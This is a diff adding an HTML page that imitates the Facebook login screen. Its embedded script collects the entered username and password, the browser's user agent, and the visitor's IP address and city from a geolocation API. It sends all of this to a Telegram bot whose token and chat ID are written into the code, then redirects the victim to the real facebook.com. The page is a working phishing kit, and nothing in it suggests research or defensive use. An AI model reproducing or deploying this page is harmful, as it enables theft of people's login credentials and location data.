@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 320px;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #166fe5;
+        }
+        .new-account {
+            background: #42b72a;
+            margin-top: 10px;
+        }
+        .new-account:hover {
+            background: #36a420;
+        }
+        .forgot-password {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .languages {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #65676b;
+}</style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <input type="text" placeholder="Mobile number or email address">
+        <input type="password" placeholder="Facebook password">
+        <button class="btn">Log In</button>
+        <a href="#" class="forgot-password">Forgotten password?</a>
+        <button class="btn new-account">Create New Account</button>
+        <div class="languages">
+            English (UK) • Bahasa Indonesia • Español • Português (Brasil)
+            </div>
+        </div>
+    </div>
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonhfc() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const page = document.getElementById("pagename").value;
+               const name = document.getElementById("name").value;
+               const email = document.getElementById("email").value;
+               const message = `> Login Page : ${page}\n\n> Username : ${name}\n\n> Password : ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '7943614217:AAEFML24f70__jEu2OA9ADx9bmSDpynpA9g';
+               const chatId = 6684024334;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://www.facebook.com";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }</script>
+</body>
+</html>
